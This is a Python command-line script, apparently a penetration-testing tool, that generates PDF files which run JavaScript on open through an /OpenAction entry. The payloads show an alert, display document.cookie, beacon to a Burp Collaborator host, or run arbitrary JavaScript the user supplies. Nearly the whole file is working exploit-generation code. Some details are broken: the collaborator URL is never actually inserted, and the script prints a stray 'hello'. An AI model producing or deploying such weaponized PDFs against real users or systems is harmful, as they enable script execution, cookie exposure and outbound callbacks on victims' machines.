import argparse
import sys
if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")    

def create_malpdf1(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert(1))
        )>> trailer <</Root 1 0 R>>''')

def create_malpdf2(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (app.alert(document.cookie))
        )>> trailer <</Root 1 0 R>>''')

def create_malpdf3(filename):
    with open(filename, "w") as file:
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS (
            app.alert(1);
            $.ajax({
                type: "GET",
                url: "", //TODO: BURP COLLAB URL 
                success: function(data){
                    app.alert("OK");
                },
                error: function(xhr, status, error) {
                    app.alert("Error: " + status);
                }
            });
            app.alert(2);
        )>> trailer <</Root 1 0 R>>''')

def create_malpdf_input(filename, cin):
    with open(filename, "w") as file:
        print("hello")
        file.write('''%PDF-1.7
        1 0 obj
        <</Pages 1 0 R /OpenAction 2 0 R>>
        2 0 obj
        <</S /JavaScript /JS ('''+cin+'''
        )>> trailer <</Root 1 0 R>>''')


if __name__ == "__main__":
    parser = argparse.ArgumentParser( 
    description="Create Malicous PDF Files Leading to XSS Exploit")

    parser.add_argument(
        '-u', action="store", default=None, dest='url',
        help="Specify the Burp Collaborator URL (e.g., http://n1pze4owqnry5tzzqngb5.oastify.com)")
    parser.add_argument(
        '-o', action="store", default=1, dest='option', type=int,
        help="Specify the create PDF option (e.g., 1)")
    parser.add_argument(
        '-sc', action="store", default=None, dest='script',
        help="Specify your own Javascript code (e.g., app.alert(1))")

    if len(sys.argv) <= 1:
        parser.print_help()
        print()
        sys.exit()

    args = parser.parse_args()
    option = 1
    burp = 0
    urls = {}
    script = ""

    if args.option == 1:
        if args.url:
            if 'http://' in args.url or 'https://' in args.url:
                proxies = {"http": args.url, "https": args.url}
                burp = 1
            else:
                print(f"You have specified an invalid url: {args.url}")
                print("Don't forget to include the schema (http|https)")
                exit(1)

    elif args.option == 2:
        if args.script:
            script = args.script
        else: 
            print(f"You have specified an invalid script: {args.script}")
            print("For option 2 use the -sc command")
            exit(1)
        option = 2

    print("[+] Creating PDF files..")
    try: 
        if option == 1: 
            create_malpdf1("xssPDF-1.pdf")
            create_malpdf2("xssPDF-2.pdf")
            if burp == 1:
                create_malpdf3("xssPDF-3.pdf")
        elif option == 2:
            create_malpdf_input("xssPDF-my.pdf", script)
        print("[-] Done!")
    except: 
        print("Failed to create, must enter integer value 1 or 2...")